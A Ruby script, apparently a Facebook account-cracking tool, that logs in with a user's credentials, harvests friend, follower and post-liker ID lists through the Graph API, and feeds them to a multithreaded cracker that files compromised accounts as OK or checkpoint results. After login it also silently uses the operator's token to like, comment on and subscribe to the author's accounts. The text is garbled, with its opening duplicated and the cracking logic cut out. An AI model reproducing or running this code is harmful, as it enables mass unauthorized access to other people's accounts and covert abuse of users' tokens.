#!/usr/bin/ruby

require 'uri'
require 'erb'
require 'date'
require 'json'
require 'digest'
require 'thread'
require 'open-uri'
require 'net/http'
require 'fileutils'

begin
  require 'user_agent_parser'
rescue LoadError
  require 'rubygems'
  require 'rubygems/gem_runner'
  Gem::GemRunner.new.run(['install','user_agent_parser'])
end

=begin
Author : ☆Raka☆™︻®╤───────═◍➤
Script : SADIS
Github : Bangsat-XD
=end

class ThreadPool
  def initialize(size:)
    @size = size
    @jobs = Queue.new
    @pool = Array.new(size) do
      Thread.new do
        catch(:exit) do
          loop do
            job, args = @jobs.pop
            job.call(*args)
          end
        end
      end
    end
  end

  def schedule(*args, &block)
    @jobs << [block, args]
  end

  def shutdown
    @size.times do
      schedule { throw :exit }
    end

    @pool.map(&:join)
  end
end


module Facebook

  class << self; attr_accessor :user_agent; end

  self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"

  class Login
  
    def self.Cookie(cookie:, graph: true)
      uri = URI("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_")
      headers = {'Host':'m.facebook.com','origin':'https://m.facebook.com','referer':'https://m.facebook.com/','User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','upgrade-insecure-requests':'1','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Cookie':cookie}

      req = Net::HTTP::Get.new(uri,headers)

      res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
      khaneysia = res.body.match(/EAAA\w+/)
      _23_08_2021 = (res['location'].to_s.include? ('checkpoint') or cookie.include? ('checkpoint') or res['set-cookie'].to_s.include? ('checkpoint'))
      rahmet = (!khaneysia and !_23_08_2021)
      if khaneysia and graph
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{khaneysia.to_s}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'access_token'=>khaneysia.to_s,'cookie'=>cookie}
      elsif khaneysia and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
        return {'error'=>rahmet,'checkpoint'=>_23_08_2021,'cookie'=>cookie}
      end
    end
    
    def self.hostname(email:,pass:,host:,graph: true)
      raise ArgumentError, "Invalid Hostname" if !['m.facebook.com','free.facebook.com','mbasic.facebook.com','touch.facebook.com'].include? (host)
      headers = {"Host":host,"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":Facebook.user_agent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      
      url = URI("https://#{host}/login.php")
      post = Net::HTTP::Post.new(url,headers)
      
      post.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
      
      login = Net::HTTP.start(url.host,url.port,:use_ssl => true) {|http| http.request(post)}
      cookie = login.to_hash['set-cookie'].collect{|ea|ea[/^.*?;/]}.join
      success = ((cookie.include? ('c_user')) or (login['location'].to_s.include? ('save-device')))
      check = (cookie.include? ('checkpoint')) or (login['location'].to_s.include? ('checkpoint'))
      
      if success and graph
        self.Cookie(cookie: cookie)
      elsif success and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
#!/usr/bin/ruby

require 'uri'
require 'erb'
require 'date'
require 'json'
require 'digest'
require 'thread'
require 'open-uri'
require 'net/http'
require 'fileutils'

begin
  require 'user_agent_parser'
rescue LoadError
  require 'rubygems'
  require 'rubygems/gem_runner'
  Gem::GemRunner.new.run(['install','user_agent_parser'])
end

=begin
Author : ☆Raka☆™︻®╤───────═◍➤
Script : SADIS
Github  : Bangsat-XD
=end

class ThreadPool
  def initialize(size:)
    @size = size
    @jobs = Queue.new
    @pool = Array.new(size) do
      Thread.new do
        catch(:exit) do
          loop do
            job, args = @jobs.pop
            job.call(*args)
          end
        end
      end
    end
  end

  def schedule(*args, &block)
    @jobs << [block, args]
  end

  def shutdown
    @size.times do
      schedule { throw :exit }
    end

    @pool.map(&:join)
  end
end


module Facebook

  class << self; attr_accessor :user_agent; end

  self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"

  class Login
  
    def self.Cookie(cookie:, graph: true)
      uri = URI("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_")
      headers = {'Host':'m.facebook.com','origin':'https://m.facebook.com','referer':'https://m.facebook.com/','User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','upgrade-insecure-requests':'1','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Cookie':cookie}

      req = Net::HTTP::Get.new(uri,headers)

      res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
      khaneysia = res.body.match(/EAAA\w+/)
      _23_08_2021 = (res['location'].to_s.include? ('checkpoint') or cookie.include? ('checkpoint') or res['set-cookie'].to_s.include? ('checkpoint'))
      rahmet = (!khaneysia and !_23_08_2021)
      if khaneysia and graph
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{khaneysia.to_s}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'access_token'=>khaneysia.to_s,'cookie'=>cookie}
      elsif khaneysia and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
        return {'error'=>rahmet,'checkpoint'=>_23_08_2021,'cookie'=>cookie}
      end
    end
    
    def self.hostname(email:,pass:,host:,graph: true)
      raise ArgumentError, "Invalid Hostname" if !['m.facebook.com','free.facebook.com','mbasic.facebook.com','touch.facebook.com'].include? (host)
      headers = {"Host":host,"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":Facebook.user_agent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      
      url = URI("https://#{host}/login.php")
      post = Net::HTTP::Post.new(url,headers)
      
      post.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
      
      login = Net::HTTP.start(url.host,url.port,:use_ssl => true) {|http| http.request(post)}
      cookie = login.to_hash['set-cookie'].collect{|ea|ea[/^.*?;/]}.join
      success = ((cookie.include? ('c_user')) or (login['location'].to_s.include? ('save-device')))
      check = (cookie.include? ('checkpoint')) or (login['location'].to_s.include? ('checkpoint'))
      
      if success and graph
        self.Cookie(cookie: cookie)
      elsif success and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
          end
        end
      end
      @pool.shutdown
      puts ("\n\033[92m[✓] TOTAL OK : #{ok.to_s.rjust(2,'0')}\033[0m")
      puts ("\033[93m[+] TOTAL CP : #{cp.to_s.rjust(2,'0')}\033[0m")
      abort("\n\033[97m[!] Finished\033[0m\n")
    end
  end
end

$logo = <<-INI_LOGO
  ________  ___  _______ __
 / ___/ _ \\/ _ |/ ___/ //_/ Author : ☆Raka☆™︻®╤────═➤
/ /__/ , _/ __ / /__/ ,<    Github  : Bangsat-XD
\\___/_/|_/_/ |_\\___/_/|_|   Version : 1.0
INI_LOGO

def tik(teks)
  for i in teks.chars << "\n"
    $stdout.write(i)
    $stdout.flush()
    sleep(0.09)
  end
end


def loading
  for x in [".   ", "..  ", "... ",".... ","\n"]
    $stdout.write("\r[!] Please Wait"+x)
    $stdout.flush()
    sleep(1)
  end
end

def main
  system ('clear')
  puts ($logo)
  puts ("[✓] ACTIVE USER : #{$name}")
  puts ("[✓] USER AGENT  : #{$ua.device.name}")
  puts ("[✓] IP ADDRESS  : #{$ip}\n\n")
  puts ("[1] Crack Dari Teman")
  puts ("[2] Crack Dari Followers")
  puts ("[3] Crack Dari Following")
  puts ("[4] Crack Dari Like Post")
  puts ("[5] Crack Dari Teman,Followers,Following")
  puts ("[6] Lihat Hasil Crack")
  puts ("[7] Settings User Agent")
  puts ("[8] Logout (hapus token)")
  puts ("[0] Exit\n\n")
  
  print ("[?] Pilih : ")
  pilih = Integer(STDIN.gets,exception: false)

  case pilih

    when 1,2,3
      case pilih; when 1; ah = "friends"; when 2; ah = "subscribers"; when 3; ah = "subscribedto"; end
      puts ("\n[!] Type 'me' to retrieve id from your account")
      print ("\n[?] Public Id  : ")
      id = STDIN.gets.chomp
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,id,#{ah}.limit(5000)&&access_token=#{$token}"))
      b = JSON.parse(a)
      if !b.key? ('name')
        puts ("[!] User Not Found!")
      else
        c = (b.key? (ah)) ? b[ah]['data'] : []
        puts ("[✓] Crack From : #{b['name']}")
        puts ("[✓] Total ID   : #{c.length}")
        Facebook::Crack.new(listid: c).start
      end
      
    when 4
      print ("\n[?] Post ID : ")
      id = STDIN.gets.chomp()
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=from&access_token=#{$token}"))
      b = JSON.parse(a)
      if b.key? ('from') or !b.key? ('error')
        puts ("\n[✓] Posted By : #{b['from']['name']}")
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}/likes?limit=5000&access_token=#{$token}"))
        b = JSON.parse(a)
        puts ("[✓] Total ID  : #{b['data'].length}\n")
        Facebook::Crack.new(listid: b['data']).start
      else
        puts ("[!] Post Not Found!")
      end
    when 5
      puts ("\n[!] Type 'me' to retrieve id from your account\n\n")
      print ("[?] Public Id  : ")
      id = STDIN.gets.chomp.downcase
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,friends.limit(5000),subscribers.limit(5000),subscribedto.limit(5000)&access_token=#{$token}"))
      b = JSON.parse(a)
      if !b.key? ('name')
        puts ("[!] User Not Found!")
      else
        teman = (b.key? ('friends')) ? b['friends']['data'] : []
        pengikut = (b.key? ('subscribers')) ? b['subscribers']['data'] : []
        mengikuti = (b.key? ('subscribedto')) ? b['subscribedto']['data'] : []
        total = (teman + pengikut + mengikuti).uniq
        puts ("[✓] Crack Feom : #{b['name']}")
        puts ("[✓] Total ID   : #{total.length}")
        Facebook::Crack.new(listid: total).start
      end
    
    when 6
      a = []
      b = []
      cp = Dir[File.join('results','CP','*')].select{|f| File.file? (f)}.map{ |f| File.expand_path f }
      ok = Dir[File.join('results','OK','*')].select{|f| File.file? (f)}.map{ |f| File.expand_path f }
      puts ("\n[1] Lihat Hasil OK (#{ok.length})")
      puts ("[2] Lihat Hasil CP (#{cp.length})")
      puts ("[0] Kembali\n\n")
      print ("[?] Pilih : ")
      naon = STDIN.gets.to_i
      if naon == 1 and !ok.empty?
        for i in ok
          File.readlines(i, chomp: true).each do |data|
            shit = data.split('|')
            if !shit[2].nil? and shit[2].include? ("??/??/????") or shit.length == 2
              a << "#{shit[0]} | #{shit[1]}"
            else
              b << data
            end
          end
        end
        puts ("\n[!] Hasil Crack Tanpa Tanggal Lahir\n\n")
        a.uniq.each {|i| puts ("\033[92m[BANCI_OK] #{i}\033[0m")}
        puts ("\n[!] Hasil Crack Dengan Tanggal Lahir\n\n")
        b.uniq.each {|i| puts ("\033[92m[BANCI_OK] #{i}\033[0m")}
      elsif naon == 1 and ok.empty?
        puts ("\n[!] Anda Tidak Memiliki Hasil OK")
      elsif naon == 2 and !cp.empty?
        for i in cp
          File.readlines(i, chomp: true).each do |data|
            shit = data.split('|')
            if !shit[2].nil? and shit[2].include? ("??/??/????") or shit.length == 2
              a << "#{shit[0]} | #{shit[1]}"
            else
              b << data
            end
          end
        end
        puts ("\n[!] Hasil Crack Tanpa Tanggal Lahir\n\n")
        a.uniq.each {|i| puts ("\033[93m[BANCI_CP] #{i}\033[0m")}
        puts ("\n[!] Hasil Crack Dengan Tanggal Lahir\n\n")
        b.uniq.each {|i| puts ("\033[93m[BANCI_CP] #{i}\033[0m")}
      elsif naon == 2 and cp.empty?
        puts ("\n[!] Anda Tidak Memiliki Hasil CP")
      else
        main()
      end
    when 7
      puts ("\n[1] Check User Agent")
      puts ("[2] Ganti User Agent")
      puts ("[0] Kembali\n\n")
      print ("[?] Pilih : ")
      ncha = STDIN.gets.to_i
      if (ncha == 1)
        puts ("\n[!] OS Information\n\n")
        puts ("[✓] OS Name    : #{$ua.os.name}")
        puts ("[✓] OS Family  : #{$ua.os.family}")
        puts ("[✓] OS Version : #{$ua.os.version}\n\n")
        puts ("[!] Device Information\n\n")
        puts ("[✓] Device Name   : #{$ua.device.name}")
        puts ("[✓] Device Family : #{$ua.device.family}")
        puts ("[✓] Device Model  : #{$ua.device.model}")
        puts ("[✓] Device Brand  : #{$ua.device.brand}\n\n\n")
        puts ("[✓] User-Agent : #{Facebook.user_agent}\n\n")
        print ("[BACK] ") ; gets
        main()
      elsif (ncha == 2)
        loop do
          print ("\n[?] Masukkan User-Agent : ")
          @agent = STDIN.gets.chomp
          break if @agent.length > 5
          puts ("\n[!] Invalid User Agent")
        end
        uah = UserAgentParser.parse(@agent)
        puts ("\n[!] OS Information\n\n")
        puts ("[✓] OS Name    : #{uah.os.name}")
        puts ("[✓] OS Family  : #{uah.os.family}")
        puts ("[✓] OS Version : #{uah.os.version}\n\n")
        puts ("[!] Device Information\n\n")
        puts ("[✓] Device Name   : #{uah.device.name}")
        puts ("[✓] Device Family : #{uah.device.family}")
        puts ("[✓] Device Model  : #{uah.device.model}")
        puts ("[✓] Device Brand  : #{uah.device.brand}\n\n\n")
        print ("[?] Ganti User-Agent(y/n) : ")
        ganti = STDIN.gets.chomp.downcase == 'y'
        if ganti
          $ua = uah.clone
          Facebook.user_agent = @agent
          File.open('.ua','w') {|f| f.write(@agent)}
          puts ("\n[✓] Berhasil Mengganti User-Agent")
        end
        print ("\n\n[BACK] ")
        gets ; main()
      else
        main()
      end
    when 8
      print ("\n[?] Do you want to continue (y/n) : ")
      sure = STDIN.gets.chomp.downcase == 'y'
      if sure
	begin
          File.delete ('login.txt')
          puts ("[✓] Successfully Delete login.txt File")
        rescue
          puts ("[!] Failed to Delete login.txt File")
        ensure
	  abort("[!] Exit")
	end
      else
        main()
      end
    when 0
      abort("[!] Exit")
    else
      puts ("[!] Invalid Input!")
      sleep(0.9)
      main()
  end
end

def LoginAkun
  begin
    system ('clear')
    puts ($logo)
    puts ("[1] Login Via Email/password (api)")
    puts ("[2] Login Via Email/password (mbasic)")
    puts ("[3] Login Via Access Token")
    puts ("[4] Login Via Cookies")
    puts ("[0] Exit")

    print ("\n[?] Pilih : ")
    no = STDIN.gets.chomp()

    case no

      when '1','01','2','02'
        print ("\n[+] Email|id : ")
        email = STDIN.gets.chomp()
        print ("[+] Password : ")
        pass = STDIN.gets.chomp()
        loading
        login = Facebook::Login.send(((no == '1' or no == '01')) ? 'Api1' : 'Mbasic',email: email,pass: pass)
        if !login['error'] and !login['checkpoint']
          $name = login['name']
          $token = login['access_token']
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >\\\\<","access_token"=>$token})
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100000834003593/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("[✓] Login Success")
          sleep(0.5)
          main()
        elsif login['checkpoint']
          abort("[!] username : #{email}\n[!] password : #{pass}\n[!] status  : Account Has Been Checkpoint")
        else
          puts ("[!] Wrong email or password")
          sleep(1.5)
          LoginAkun()
        end
      
      when '3','03'
        print ("\n[+] Access Token : ")
        $token = STDIN.gets.chomp()
        loading
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{$token}"))
        b = JSON.parse(a)
        if b.key? ('name')
          $name = b['name']
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >,<","access_token"=>$token})
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100000834003593./subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("[✓] Login Success")
          main()
        elsif b.key? ('error') and b['error']['code'] == 190
          puts ("[!] #{b['error']['message']}")
          sleep (1)
          LoginAkun()
        else
          puts ("[!] Invalid Access Token")
          sleep(1)
          LoginAkun()
        end
      when '4','04'
        print ("\n[+] Enter Cookies : ")
        cookie = STDIN.gets.chomp()
        loading
        login = Facebook::Login.Cookie(cookie: cookie)
        if !login['error'] and !login['checkpoint']
          $name = login['name']
          $token = login['access_token']
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] ><","access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100000834003593/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("[✓] Login Success")
          sleep(0.5)
          main()
        elsif login['checkpoint']
          abort ("[!] Account Has Been Checkpoint")
        else
          puts ("[!] Invalid Cookies")
          sleep(1)
          LoginAkun()
        end
      when '0','00'
        abort ("[!] Exit")
      else
        puts ("[!] Invalid Input!")
        sleep(0.9)
        LoginAkun()
    end
  rescue SocketError
    abort ("[!] No Connection")
  rescue Errno::ETIMEDOUT,Net::OpenTimeout
    abort ("[!] Connection timed out")
  rescue Interrupt
    abort ("[!] Exit")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("[!] There is an error\n[!] Please Try Again")
  end
end  

def masuk()
  begin
    $ip = JSON.parse(Net::HTTP.get(URI("https://api.myip.com")))['ip']
    $token = File.read('login.txt')
    a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{$token}"))
    b = JSON.parse(a)
    if b.key? ('name')
      $name = b['name']
      main()
    else
      puts ("[!] Invalid Access Token")
      File.delete("login.txt")
      sleep(0.9)
      LoginAkun()
    end
  rescue Errno::ENOENT
    LoginAkun()
  rescue SocketError
    abort ("[!] No Connection")
  rescue Errno::ETIMEDOUT,Net::OpenTimeout
    abort ("[!] Connection timed out")
  rescue Interrupt
    abort ("[!] Exit")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("[!] There is an error\n[!] Please Try Again")
  end
end

if __FILE__ == $0
  if File.file? ('.ua') and File.read('.ua').length != 0
    dta = File.read('.ua').strip
    Facebook.user_agent = dta
    $ua = UserAgentParser.parse(dta)
  else
    File.open('.ua','w') {|f| f.write(Facebook.user_agent)}
    $ua = UserAgentParser.parse(Facebook.user_agent)
  end
  FileUtils.mkdir_p('results')
  FileUtils.mkdir_p(File.join('results','CP'))
  FileUtils.mkdir_p(File.join('results','OK'))
  masuk()
end
